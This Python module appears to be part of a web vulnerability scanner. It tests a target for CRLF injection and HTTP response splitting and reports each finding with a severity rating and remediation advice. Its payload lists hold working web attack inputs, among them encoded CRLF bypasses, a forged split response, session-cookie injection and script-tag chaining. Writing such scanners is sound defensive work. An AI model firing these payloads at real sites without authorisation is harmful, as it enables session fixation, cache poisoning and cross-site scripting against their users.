"""
crlf_scanner.py — CRLF Injection / HTTP Response Splitting
============================================================
Expert-grade rewrite (GAP-007 fix):
  1. Path-based injection (original + new payloads)
  2. Query parameter injection
  3. Unicode/double-encoded CRLF bypass variants
  4. Cookie injection via Location header chain
  5. Response splitting (Set-Cookie + HTTP/1.1 200 OK injection)
  6. Redirect parameter injection (common real-world vector)
"""
import urllib.parse
from scanners.base_scanner import BaseScanner

INJECT_HEADER = "Wss-Crlf-Test"
INJECT_VALUE = "wss-crlf-confirmed"

PATH_PAYLOADS = [
    f"/%0d%0a{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%0a{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%0d%0aSet-Cookie:{INJECT_HEADER}={INJECT_VALUE}",
    f"/%0d%0aContent-Length:0%0d%0aHTTP/1.1 200 OK%0d%0a{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%E5%98%8A%E5%98%8D{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%E5%98%8A{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%0d%0a{INJECT_HEADER}:{INJECT_VALUE}%0d%0aX-Extra:test",  # double-encode variant
    f"/%250d%250a{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%0d%0aX-CRLF-Test:%20{INJECT_VALUE}",
    f"/%0a%0d{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%23%0a{INJECT_HEADER}:{INJECT_VALUE}",
    f"/%0d%0a%0d%0a<script>alert(1)</script>",
]

PARAM_PAYLOADS = [
    f"%0d%0a{INJECT_HEADER}:{INJECT_VALUE}",              # standard percent-encoded
    f"%0a{INJECT_HEADER}:{INJECT_VALUE}",                # LF only
    f"%0d%0aSet-Cookie:{INJECT_HEADER}={INJECT_VALUE}",  # cookie injection
    f"%0d%0aSet-Cookie:session=injected;path=/",         # session cookie injection
    f"%0d%0a{INJECT_HEADER}:{INJECT_VALUE}%0d%0a%0d%0a<html><script>alert(1)</script></html>",
    f"%250d%250a{INJECT_HEADER}:{INJECT_VALUE}",         # double-encoded
]

REDIRECT_PARAMS = [
    "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "returnto", "next", "url", "goto", "location", "dest", "destination",
]


class CrlfScanner(BaseScanner):
    SCANNER_NAME = "CRLF Injection Scanner"
    _SCANNER_KEY = "crlf"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[CRLF] Testing HTTP Response Splitting on {self.target}...")

        self._test_path_injection()
        if self.vulns:
            return self.vulns

        self._test_query_param_injection()
        if self.vulns:
            return self.vulns

        self._test_redirect_params()

        if not self.vulns:
            self.log("SUCCESS", "[CRLF] No CRLF injection detected.")
        return self.vulns

    def _test_path_injection(self):
        base = self.target.rstrip("/")
        for payload in PATH_PAYLOADS:
            test_url = base + payload
            body, status, resp_headers = self._make_request(
                test_url, return_response_obj=True
            )
            if resp_headers and self._header_injected(resp_headers):
                self._report("URL path", payload, resp_headers)
                return

    def _test_query_param_injection(self):
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs:
            return
        for k, v in qs:
            for payload in PARAM_PAYLOADS:
                test_qs = [(k_p, (v_p + payload if k_p == k else v_p)) for k_p, v_p in qs]
                test_url = parsed._replace(query=urllib.parse.urlencode(test_qs)).geturl()
                body, status, resp_headers = self._make_request(
                    test_url, return_response_obj=True
                )
                if resp_headers and self._header_injected(resp_headers):
                    self._report(f"Query param `{k}`", payload, resp_headers)
                    return

    def _test_redirect_params(self):
        parsed = urllib.parse.urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in REDIRECT_PARAMS:
            for payload in PARAM_PAYLOADS[:3]:
                test_url = f"{base}?{param}=https://example.com{urllib.parse.quote(payload)}"
                body, status, resp_headers = self._make_request(
                    test_url, return_response_obj=True
                )
                if resp_headers and self._header_injected(resp_headers):
                    self._report(f"Redirect param `{param}`", payload, resp_headers)
                    return
                if resp_headers:
                    loc = resp_headers.get("Location", "")
                    if INJECT_HEADER.lower() in loc.lower():
                        self._report(f"Redirect param `{param}` -> Location header", payload, resp_headers)
                        return

    def _header_injected(self, headers) -> bool:
        if headers.get(INJECT_HEADER):
            return True
        if headers.get("Set-Cookie") and INJECT_HEADER in (headers.get("Set-Cookie") or ""):
            return True
        return False

    def _report(self, vector: str, payload: str, headers):
        self.log("CRITICAL", f"[CRLF] Injection confirmed via {vector}!")
        evidence_header = INJECT_HEADER
        for k, v in headers.items():
            if k.lower() == INJECT_HEADER.lower():
                evidence_header = f"{k}: {v}"
                break
        self.add_vuln(
            title="CRLF Injection / HTTP Response Splitting",
            severity="High",
            category="CRLF Injection",
            cvss_score=7.4,
            confidence="Confirmed",
            references=[
                "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
                "https://cwe.mitre.org/data/definitions/113.html",
            ],
            description=(
                f"CRLF injection confirmed via **{vector}**.\n\n"
                f"**Payload:** `{payload}`\n\n"
                f"By injecting `%0d%0a` (Carriage Return + Line Feed) sequences, an attacker can:\n"
                "- Inject arbitrary HTTP response headers (`Set-Cookie`, `Location`)\n"
                "- Perform HTTP Response Splitting to poison caches\n"
                "- Conduct session fixation attacks via `Set-Cookie` injection\n"
                "- Chain into XSS via injected `Content-Type: text/html`\n"
                "- Bypass CSP by injecting a new `Content-Security-Policy` header"
            ),
            remediation=(
                "1. URL-encode all user input before including it in HTTP headers or redirect URLs.\n"
                "2. Reject or strip `\\r` and `\\n` characters from all user-supplied values.\n"
                "3. Use web framework redirect functions (`redirect()`) instead of raw `Location:` header setting.\n"
                "4. Implement a WAF rule blocking `%0d`, `%0a`, `\\r`, `\\n` in header values.\n"
                "5. Set `Content-Security-Policy` and `X-Frame-Options` to limit XSS chaining."
            ),
            payload=payload,
            evidence=f"Header `{evidence_header}` found in server response after injection via {vector}.",
            request_details=f"Injection via {vector}",
            response_details=f"Injected header found: {evidence_header}",
        )
